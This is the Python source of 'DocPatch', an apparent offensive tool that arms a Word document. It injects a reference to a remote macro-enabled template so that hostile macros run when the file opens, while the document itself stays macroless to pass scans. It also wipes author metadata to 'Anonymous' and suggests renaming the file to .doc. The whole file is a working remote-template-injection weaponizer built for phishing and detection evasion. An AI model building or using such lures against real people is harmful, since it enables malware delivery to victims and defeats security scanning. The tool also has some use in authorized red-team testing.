#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
DocPatch edits macro-enabled Word documents (.dotm or Word 97 documents) to add a reference to a
remote macro-enabled template in the XML. The template is loaded before the document is completely
opened, so macros can be added to the template and still make use of functions like Auto_Open()
while the primary document remains macroless to pass scans and basic analysis.

Author: Christopher Maddalena
Date:   3 December 2018
"""


import os
import sys
import shutil

import click
import zipfile
import lxml.etree


def inplace_change(filename, old_string, new_string):
    """Opens the named file and replaces the specified string with the new string."""
    with open(filename) as f:
        s = f.read()
        if old_string not in s:
            click.secho('[!] "{old_string}" not found in {filename}.'.format(**locals()), fg="red")
            return
    with open(filename, 'w') as f:
        click.secho('[+] Changing "{old_string}" to "{new_string}" in {filename}'.format(**locals()), fg="green")
        s = s.replace(old_string, new_string)
        f.write(s)
        f.close()


# Setup a class for CLICK
class AliasedGroup(click.Group):
    """Allows commands to be called by their first unique character."""

    def get_command(self, ctx, cmd_name):
        """
        Allows commands to be called by their first unique character
            :param ctx: Context information from click
            :param cmd_name: Calling command name
            :return:
        """
        command = click.Group.get_command(self, ctx, cmd_name)
        if command is not None:
            return command
        matches = [x for x in self.list_commands(ctx)
                   if x.startswith(cmd_name)]
        if not matches:
            return None
        elif len(matches) == 1:
            return click.Group.get_command(self, ctx, matches[0])
        ctx.fail("Too many matches: %s" % ", ".join(sorted(matches)))


# That's right, we support -h and --help! Not using -h for an argument like 'host'! ;D
CONTEXT_SETTINGS = dict(help_option_names=['-h', '--help'], max_content_width=200)
@click.group(cls=AliasedGroup, context_settings=CONTEXT_SETTINGS)

# Note: The following function descriptors will look weird and some will contain '' in spots.
# This is necessary for CLICK. These are displayed with the help info and need to be written
# just like we want them to be displayed in the user's terminal. Whitespace really matters.

def docpatch():
    """The base command for DocPatch, used with the group created above."""
    # Everything starts here
    pass

@docpatch.command(name='docpatch',short_help='To use DocPatch, just run `python3 docpatch.py` and answer the prompts.')
@click.option('--doc', prompt='Document to arm',
              help='The name and file path and name of the document to edit/arm. The file should \
be saved as a macro-enabled document -- .docm document or a Word 97 document.')
@click.option('--server', prompt='URI for the template (.dotm) file',
              help='The full URI for the template (.dotm) file.')
def arm(doc, server):
    """To use DocPatch, just run `python3 docpatch.py` and answer the prompts. You can also use the
    following options to declare each value on the command line.
    """
    document_name = doc
    # Local values for managing the unzipped Word document contents
    dir_name = "funnybusiness"
    core_xml_loc = "funnybusiness/docProps/core.xml"
    settings_file_loc = "funnybusiness/word/settings.xml"
    theme_file_loc = "funnybusiness/word/_rels/settings.xml.rels"
    # The XML inserted into the armed document
    themes_value = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\
    <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">\
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" \
    Target="' + server + '" TargetMode="External"/></Relationships>'
    settings_value = '<w:attachedTemplate r:id="rId1"/></w:settings>'
    core_xml_value = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\
<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/" xmlns:dcmitype="http://purl.org/dc/dcmitype/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><dc:title></dc:title><dc:subject></dc:subject><dc:creator></dc:creator><dc:description></dc:description><cp:lastModifiedBy></cp:lastModifiedBy><cp:revision>1</cp:revision><dcterms:created xsi:type="dcterms:W3CDTF">2018-10-09T00:27:00Z</dcterms:created><dcterms:modified xsi:type="dcterms:W3CDTF">2018-11-29T22:32:00Z</dcterms:modified><dc:language></dc:language></cp:coreProperties>'
    # Check if the document is a macro-enabled Word document
    if not document_name.split(".")[-1] == "docm":
        if document_name.split(".")[-1] == "docx":
            click.secho("[!] This document is a .docx file and will not work. You need a \
macro-enabled document, either a .docm or a Word 97 document.", fg="red")
        else:
            click.secho("[*] It looks like the document you specified may not be a macro-enabled \
Word document (not a .docm). This is only a warning. This will still work if you've removed the \
'm' or saved the document as a Word 97 .doc document.", fg="yellow")
    # Create the temporary directory for the extracted document contents
    if not os.path.exists(dir_name):
        try:
            click.secho("[+] Creating temporary working directory: %s" % dir_name, fg="green")
            os.makedirs(dir_name)
        except OSError as error:
            click.secho("[!] Could not create the reports directory!", fg="red")
            click.secho("L.. Details: {}".format(error), fg="red")
    else:
        click.secho("[*] Specified directory already exists: %s" % dir_name, fg="yellow")
    # Extract the documents contents for editing the XML
    click.secho("[+] Unzipping %s into %s" % (document_name, dir_name), fg="green")
    try:
        with zipfile.ZipFile(document_name, 'r') as zip_handler:
            zip_handler.extractall(dir_name)
    except Exception as error:
        click.secho("[!] Oops! The document could not be unzipped. Are you sure it's a valid macro-enabled Word document?", fg="red")
        click.secho("L.. Details: {}".format(error), fg="red")
    # Edit the stylesheet in settings.xml and settings.xml.rels
    click.secho("[+] Writing to %s..." % settings_file_loc, fg="green")
    inplace_change(settings_file_loc, '</w:settings>', settings_value)
    click.secho("[+] Writing to %s..." % theme_file_loc, fg="green")
    with open(theme_file_loc, 'w') as fh:
        click.secho("[*] Theme values:\n", fg="green")
        click.secho(themes_value + "\n", fg="green")
        fh.write(themes_value)
    # Edit docProps/core.xml to overwrite identifying metadata
    # Declare namespaces to be used during XML parsing
    dc_ns={'dc': 'http://purl.org/dc/elements/1.1/'}
    cp_ns={'cp': 'http://schemas.openxmlformats.org/package/2006/metadata/core-properties'}
    dcterms_ns={'dcterms': 'http://purl.org/dc/terms/'}
    # Name of the creator and last modified user
    user_name = "Anonymous"
    # Parse the XML and change the values
    click.secho("[+] Nuking the contents of core.xml to remove any identifying creator data:", fg="green")
    with open(core_xml_loc, 'r') as fh:
        root = lxml.etree.parse(core_xml_loc)
        creator = root.xpath('//dc:creator', namespaces=dc_ns)
        last_modified_user = root.xpath('//cp:lastModifiedBy', namespaces=cp_ns)
        if creator:
            click.secho("[*] Changing creator from {} to {}.".format(creator[0].text, user_name), fg="green")
            creator[0].text = user_name
        if last_modified_user:
            click.secho("[*] Changing lastModifiedBy from {} to {}.".format(last_modified_user[0].text, user_name), fg="green")
            last_modified_user[0].text = user_name
        tags = root.xpath('//cp:keywords', namespaces=cp_ns)
        if tags:
            click.secho("[*] Changing document's tags to None.", fg="green")
            tags[0].text = "None"
        description = root.xpath('//dc:description', namespaces=dc_ns)
        if description:
            click.secho("[*] Changing document's description to None.", fg="green")
            description[0].text = "None"
        created_time = root.xpath('//dcterms:created', namespaces=dcterms_ns)
        last_modified_time = root.xpath('//dcterms:modified', namespaces=dcterms_ns)
        click.secho("[*] The document's timestamps are {} (created) and {} (last modified).".format(created_time[0].text, last_modified_time[0].text), fg="green")
    # Write the final core.xml contents
    with open(core_xml_loc, 'wb') as fh:
        click.secho("[+] Final core.xml contents is:\n", fg="green")
        click.secho("{}\n".format(lxml.etree.tostring(root)), fg="green")
        fh.write(b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n')
        fh.write(lxml.etree.tostring(root))
    # Reassemble the document with the new XML
    os.chdir(dir_name)
    click.secho("[+] Reassembling the document...", fg="green")
    with zipfile.ZipFile('../armed_%s' % document_name, 'w') as zip_handler:
        for root, dirs, files in os.walk('.'):
            for file in files:
                zip_handler.write(os.path.join(root, file))
    # Delete the temporary directory
    os.chdir("../")
    click.secho("[+] Nuking contents of temp directory, %s" % dir_name, fg="green")
    shutil.rmtree(dir_name)
    # Job is done and document is armed and ready
    click.secho('[+] Job\'s done! armed_%s is armed and ready. Feel free to change the extension to .doc to drop the "m" and rock and roll.' % document_name, fg="green")

if __name__ == '__main__':
    arm()
